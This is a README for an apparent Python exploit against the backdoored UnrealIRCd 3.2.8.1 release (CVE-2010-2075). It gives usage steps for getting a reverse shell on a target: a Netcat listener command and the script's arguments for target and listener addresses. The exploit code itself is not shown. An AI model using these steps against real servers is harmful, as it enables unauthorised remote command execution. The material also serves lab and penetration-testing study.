# UnrealIRCD 3.2.8.1 Backdoor Command Execution
UnrealIRCD 3.2.8.1 backdoor command execution exploit in Python 3 (CVE-2010-2075).

# Description
[UnrealIRCD](https://www.unrealircd.org/) version 3.2.8.1 contains a trojan horse which allows remote attackers to execute arbitrary commands ([CVE-2010-2075](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075)).

I referenced the Metasploit payload `payload/cmd/unix/reverse_perl` to make this script. 

# Usage
Start a Netcat listener on the listening host:
```
nc -lp 4444
```

Execute the script, providing the following arguments:
- Target host IP address.
- Target host port number.
- Listening host IP address.
- Listening host port number.
```
python3 script.py <target> <port> <listener> <port>
```
